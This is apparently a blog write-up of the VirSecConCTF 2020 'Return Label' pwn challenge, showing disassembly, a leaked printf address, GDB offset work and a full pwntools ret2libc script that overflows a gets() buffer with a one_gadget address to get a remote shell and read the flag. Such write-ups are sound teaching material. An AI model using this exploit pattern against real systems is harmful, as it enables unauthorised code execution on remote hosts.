---
layout: post
title: VirSecConCTF 2020 - Return Label
excerpt: "Writeup for ret2libc buffer overflow challenge from VirSecConCTF 2020"
categories: [pwn]
---

Return label was fourth pwn challenge from VirSecCon2020. The challenge provided a binary and a challenge server. Running the binary gives us the address for printf in libc and asks where we should send a package (seen below).

```
michael@computer:~/Documents/CTF/virseccon/retlab$ ./challenge 
Where should we send your package (printf is at 00007f580de11e80)? 
```


Running [radare2](https://www.radare.org/r/index.html) on the binary we can list out the functions (seen below).

```
[0x000006c0]> afl
0x00000000    2 25           sym.imp.__libc_start_main
0x00000638    3 23           sym._init
0x00000660    1 6            sym.imp.puts
0x00000670    1 6            sym.imp.printf
0x00000680    1 6            sym.imp.gets
0x00000690    1 6            sym.imp.fflush
0x000006a0    1 6            sym.imp.dlsym
0x000006b0    1 6            sub.__cxa_finalize_248_6b0
0x000006c0    1 43           entry0
0x000006f0    4 50   -> 40   sym.deregister_tm_clones
0x00000730    4 66   -> 57   sym.register_tm_clones
0x00000780    4 49           sym.__do_global_dtors_aux
0x000007c0    1 10           entry1.init
0x000007ca    1 118          sym.vuln
0x00000840    1 27           sym.main
0x00000860    4 101          sym.__libc_csu_init
0x000008d0    1 2            sym.__libc_csu_fini
0x000008d4    1 9            sym._fini
```

Seeing that there is no "flag" or "secret" functions we can safely assume that we will need to return to somewhere useful inside of libc. Looking at the code for main, we can see that it simply calls "vuln". 

```
[0x00000840]> pdf
            ;-- main:
/ (fcn) sym.main 27
|   sym.main ();
|           ; var int local_10h @ rbp-0x10
|           ; var int local_4h @ rbp-0x4
|              ; DATA XREF from 0x000006dd (entry0)
|           0x00000840      55             push rbp
|           0x00000841      4889e5         mov rbp, rsp
|           0x00000844      4883ec10       sub rsp, 0x10
|           0x00000848      897dfc         mov dword [local_4h], edi
|           0x0000084b      488975f0       mov qword [local_10h], rsi
|           0x0000084f      e876ffffff     call sym.vuln
|           0x00000854      b800000000     mov eax, 0
|           0x00000859      c9             leave
\           0x0000085a      c3             ret
```

Looking at the code for vuln, we can see a call to the dangerous "gets" function which does not check buffer size before writing (leading to a buffer overflow). Now that we have an idea of what we need to do we can use the [one_gadget](https://github.com/david942j/one_gadget) tool to find an offset that will give us RCE (seen below). Since the challenge did not provide a libc, I just used the libc included in my Ubuntu distribution, and it worked!

```
michael@computer:~/Documents/CTF/virseccon/retlab$ one_gadget /lib/x86_64-linux-gnu/libc-2.27.so
0x45216 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

We will keep these in mind. Next I launched GDB to find the offset between libc base and printf. I also calculated the amount of characters we need to write before reaching the return pointer.

```
(gdb) x printf
0x7ffff7835800 <__printf>:	0xd8ec8148
(gdb) i proc mapping
process 9919
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x555555554000     0x555555555000     0x1000        0x0 /home/michael/Documents/CTF/virseccon/retlab/challenge
      0x555555754000     0x555555755000     0x1000        0x0 /home/michael/Documents/CTF/virseccon/retlab/challenge
      0x555555755000     0x555555756000     0x1000     0x1000 /home/michael/Documents/CTF/virseccon/retlab/challenge
      0x7ffff77e0000     0x7ffff79c7000   0x1e7000        0x0 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff79c7000     0x7ffff7bc7000   0x200000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
(gdb) c
Continuing.
Where should we send your package (printf is at 00007ffff7844e80)? 

AAAA

Breakpoint 2, 0x000055555555481f in vuln ()
(gdb) x/xg $rsp
0x7fffffffde10:	0x0000000041414141
(gdb) c
Continuing.

Breakpoint 3, 0x000055555555483f in vuln ()
(gdb) x/xg $rsp
0x7fffffffdea8:	0x0000555555554854
(gdb) q
michael@computer:~/Documents/CTF/virseccon/retlab$ python
Python 2.7.17 (default, Nov  7 2019, 10:07:09) 
[GCC 7.4.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x7ffff7835800 - 0x7ffff77e0000
350208
>>>  0x7fffffffdea8 - 0x7fffffffde10
152 
```

Okay, looks like we need to write 152 characters before the gadget address. We are finally ready to string everything together (as seen in the script below).

{% highlight python %}
from pwn import *

r = remote('jh2i.com', 50005)

printf = int(r.recvuntil('?').split(' ')[9][:-2], 16)

libc_base = printf - 350208

gadget = libc_base + 0x45216

payload = 'A' * 152 + p64(gadget)

r.sendline(payload)

r.interactive()
{% endhighlight %}

Running this gives us a prompt, which is a remote shell on the server!

```
michael@computer:~/Documents/CTF/virseccon/retlab$ python retlab.py 
[+] Opening connection to jh2i.com on port 50005: Done
[*] Switching to interactive mode
 
$ id
uid=8888(pwn) gid=8888(pwn) groups=8888(pwn)
$ cat flag.txt
LLS{r0p_1s_fun}
```

We can use the shell to obtain the flag `LLS{r0p_1s_fun}`. I hope this was helpful!